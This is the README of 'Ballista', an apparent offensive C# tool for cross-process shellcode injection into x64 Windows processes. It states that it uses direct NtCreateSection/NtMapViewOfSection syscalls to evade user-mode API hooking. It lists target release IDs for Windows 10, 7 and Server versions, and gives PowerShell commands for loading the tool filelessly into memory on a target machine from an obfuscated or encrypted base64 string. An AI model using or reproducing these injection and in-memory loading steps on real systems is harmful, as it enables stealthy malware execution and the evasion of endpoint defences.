# Ballista
**Ballista** is a C# tool responsible for x64 cross-process injection. The tool relies on `NtCreateSection()` and `NtMapViewOfSection()` syscalls in order to evade user level API hooking.

# Usage
```console
Ballista.exe <release> <x64_pid>         <b64_x64sc>
Ballista.exe <release> <x64_processName> <b64_x64sc>
```

| Argument          | Description                           |
| -----------       | -----------                           |
| release           | Target Release ID (see the releases section)                  |
| x64_pid           | Process ID of a remote process        |
| x64_processName   | Name of an x64 process to inject into |
| b64_x64sc         | Base64 encoded shellcode              |


## Releases
> Note: *Windows Server 2016* and *2019* offsets rely on an assumption that the offsets in these specific systems are the same as in their Windows 10 version equivalents. Further testing is advised.

### Windows 10
| Windows 10 Version | Release ID     |
| -----------        | -----------    |
| 20H2               | 1              |
| 2004               | 2              |
| 1909               | 3              |
| 1903               | 4              |
| 1809               | 5              |
| 1803               | 6              |
| 1709               | 7              |
| 1703               | 8              |
| 1607               | 9              |
| 1511               | 10             |
| 1507               | 11             |


### Windows 7
| Windows 7 Version  | Release ID     |
| -----------        | -----------    |
| SP1                | 12             |
| SP0                | 12             |


### Windows Server 2019
| Windows 10 Version | Release ID     |
| -----------        | -----------    |
| 20H2               | 1              |
| 2004               | 2              |
| 1909               | 3              |
| 1903               | 4              |
| 2019 LTSC (1809)   | 5              |


### Windows Server 2016
| Windows 10 Version | Release ID     |
| -----------        | -----------    |
| 2016 LTSC (1607)   | 9              |
| 1511               | 10             |
| 1507               | 11             |


### Windows Server 2012
| Server 2012 Version | Release ID     |
| -----------         | -----------    |
| R2                  | 13             |
| SP0                 | 14             |


# Reflection
**Ballista** can be easily reflected into memory using a serialized base64 string, which can be generated by `reflectionUtil.py`:
```powershell
PS C:\Users\tester> python .\reflectionUtil.py Key 1 notepad /EiD5PDow...
WV4CAxsSHxMIX0cgBShaJysd...

PS C:\Users\tester> [System.Reflection.Assembly]::LoadFile("C:\Users\tester\Ballista.exe")

GAC    Version        Location
---    -------        --------
False  v4.0.30319     C:\Users\tester\Ballista.exe

PS C:\Users\tester> [Ballista.Ballista]::Shoot("WV4CAxsSHxMIX0cgBShaJysd...", "Key")
```

Alternatively, one can Base64 encode (or obfuscate / encrypt) the binary on a local machine:
```powershell
PS C:\Users\tester> $dll = [System.IO.File]::ReadAllBytes("C:\Users\tester\Ballista.exe")
PS C:\Users\tester> [System.Convert]::ToBase64String($dll)
TVqQAAMAAAAEAAAA//8AA...
```

And afterwards load it on a target machine in the following way:

```powershell
PS C:\Users\tester> [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String("TVqQAAMAAAAEAAAA//8AA..."))

GAC    Version        Location
---    -------        --------
False  v4.0.30319     

PS C:\Users\tester> [Ballista.Ballista]::Shoot("WV4CAxsSHxMIX0cgBShaJysd...", "Key")
```